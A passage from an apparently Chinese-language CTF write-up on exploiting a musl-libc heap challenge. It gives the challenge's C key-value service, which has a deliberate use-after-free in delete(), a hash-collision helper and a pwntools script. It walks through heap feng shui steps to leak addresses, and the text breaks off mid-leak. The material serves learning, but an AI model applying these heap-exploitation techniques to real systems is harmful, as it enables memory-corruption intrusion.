class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> H[<span class="number">0x100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="type">uint32_t</span> shift = rand();</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R 0x7f</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> a = L; a &lt; R; a++) &#123;</span><br><span class="line">        tmp[<span class="number">0</span>] = a;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> b = L; b &lt; R; b++) &#123;</span><br><span class="line">            tmp[<span class="number">1</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c = L; c &lt; R; c++) &#123;</span><br><span class="line">                tmp[<span class="number">2</span>] = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> d = L; d &lt; R; d++) &#123;</span><br><span class="line">                    tmp[<span class="number">3</span>] = d;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">char</span> e = L; e &lt; R; e++) &#123;</span><br><span class="line">                        tmp[<span class="number">4</span>] = e;</span><br><span class="line">                        <span class="type">uint32_t</span> h = key_hash(&amp;tmp, <span class="number">5</span>) - shift;</span><br><span class="line">                        <span class="keyword">if</span> (h &lt; <span class="number">0x100000</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (H[h] == <span class="number">0</span>) &#123;</span><br><span class="line">                                H[h] = *(<span class="type">uint64_t</span> *)&amp;tmp;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;%s %s =&gt; %#08x\n&quot;</span>, tmp, &amp;H[h], h);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recvuntil</span><span class="params">(<span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">if</span> (read(<span class="number">0</span>, &amp;c, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">char</span> *)buf)[i] = c;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            ((<span class="type">char</span> *)buf)[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">readint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    recvuntil(&amp;buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_key</span><span class="params">(<span class="type">uint8_t</span> **key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> key_size = readint();</span><br><span class="line">    *key = <span class="built_in">calloc</span>(<span class="number">1</span>, key_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*key, key_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_value</span><span class="params">(<span class="type">uint8_t</span> **value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> value_size = readint();</span><br><span class="line">    *value = <span class="built_in">calloc</span>(<span class="number">1</span>, value_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*value, value_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> *key;</span><br><span class="line">    <span class="type">uint8_t</span> *value;</span><br><span class="line">    <span class="type">size_t</span> key_size;</span><br><span class="line">    <span class="type">size_t</span> value_size;</span><br><span class="line">    <span class="type">uint64_t</span> hash;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">// struct node *prev;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">2021</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">value_dump</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx:&quot;</span>, size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MASK (HASH_SIZE - 1)</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">list_heads</span>[<span class="title">HASH_SIZE</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: store&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: query&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;option: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> node *<span class="title function_">lookup</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = key_hash(key, key_size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">struct</span> node *n = list_heads[h &amp; HASH_MASK]; n; n = n-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n-&gt;hash == h &amp;&amp; n-&gt;key_size == key_size &amp;&amp; !<span class="built_in">memcmp</span>(key, n-&gt;key, key_size)) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">node</span> =</span> <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">    node-&gt;key_size = read_key(&amp;node-&gt;key);</span><br><span class="line">    <span class="comment">// always insert to the head, don&#x27;t check duplicated entries</span></span><br><span class="line">    node-&gt;value_size = read_value(&amp;node-&gt;value);</span><br><span class="line">    node-&gt;hash = key_hash(node-&gt;key, node-&gt;key_size);</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> h = node-&gt;hash &amp; HASH_MASK;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span> =</span> list_heads[h];</span><br><span class="line">    list_heads[h] = node;</span><br><span class="line">    node-&gt;next = next;</span><br><span class="line">    <span class="comment">// node-&gt;prev = NULL;</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">query</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value_dump(n-&gt;value, n-&gt;value_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> node **p = &amp;list_heads[n-&gt;hash &amp; HASH_MASK];</span><br><span class="line">        <span class="keyword">if</span> (*p == n || n-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// above condition is buggy</span></span><br><span class="line">            <span class="comment">// remove `n` from the linked list</span></span><br><span class="line">            <span class="keyword">while</span> (*p != n) &#123;</span><br><span class="line">                p = &amp;(*p)-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            *p = n-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// uaf: if `n` is at the tail of the linked list</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;value);</span><br><span class="line">        <span class="built_in">free</span>(n);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> op = readint();</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                store();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                query();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>很好，一做题就废，跟着<code>sung3r</code>师傅的文章才一步一步的复现出来，这里就对<code>sung3r</code>的文章进行部分补充<br>需要注意：需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code><br>可以看到<code>query()</code>函数每次打印的数据是该哈希链表最外侧结点的数据，而插入结点则是将结点插入最内侧<br>可以看到<code>delete()</code>函数当<code>n</code>为哈希链表的尾部且该哈希链表的结点个数大于一个时，会跳过循环直接进行<code>free</code>，存在<code>UAF</code>漏洞<br>每次<code>store</code>时，都会申请<code>0x30</code>大小的空间来存储改结点的信息，该空间结构为：</p><img src="/2024/01/17/musl/6.png" class="" title="我的图图呢">  <p>交互脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>这里粘贴<code>sung3r</code>师傅关于<code>group</code>对<code>chunk</code>的管理策略：</p><ul><li><code>chunk</code>按照内存先后，依次分配</li><li><code>free</code>掉的<code>chunk</code>不能马上分配</li><li>需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code></li><li>分配<code>chunk</code>时，会将<code>user data</code>域用<code>\x00</code>初始化</li></ul><p>接下来即可利用堆风水来进行地址的泄露<br>我们首先申请随便申请一个堆块，来防止防止<code>free</code>掉<code>group</code>所有<code>chunk</code>时，将整个<code>group</code>内存归还给堆管理器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>我们来看看此时的<code>group</code>的情况：</p><img src="/2024/01/17/musl/7.png" class="" title="我的图图呢">  <p>可以发现，该存储<code>0x30</code>大小堆块的<code>group</code>最多可以存储<code>7</code>个堆块<br>接下来，除最后一个与第一个<code>chunk</code>，其余全部<code>free</code>掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><img src="/2024/01/17/musl/8.png" class="" title="我的图图呢">  <p>接下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>group的布局为：</p><img src="/2024/01/17/musl/9.png" class="" title="我的图图呢">  <p>再申请一个与’\n’同hash的chunk：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这个时候<code>’\n’</code>的哈希链表中就有两个元素，<code>group</code>的布局为：</p><img src="/2024/01/17/musl/10.png" class="" title="我的图图呢">  <p>此时将<code>key</code>为<code>’\n’</code>的堆块删除并将<code>group</code>未被使用的堆块全部<code>free</code>掉:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>由前面的分析可以知道，此时触发的<code>UAF</code>漏洞，被标为<code>UAF</code>的堆块即为<code>’\n’</code>堆块的<code>value</code>区域，我们可以通过将另一个堆块的<code>struct</code>结构体申请到这里，从而通过<code>query</code>函数访问<code>’\n’</code>来泄露出<code>value</code>的地址。此时<code>group</code>的布局为：</p><img src="/2024/01/17/musl/11.png" class="" title="我的图图呢">  <p>最后申请一个堆块泄露地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>group布局为：</p><img src="/2024/01/17/musl/12.png" class="" title="我的图图呢">  <p>同样，我们也能够用相同的策略将<code>libc</code>基地址等内存信息<code>leak</code>出来<br>leak代码：</p><figure class="highlight python"><table><tr><td 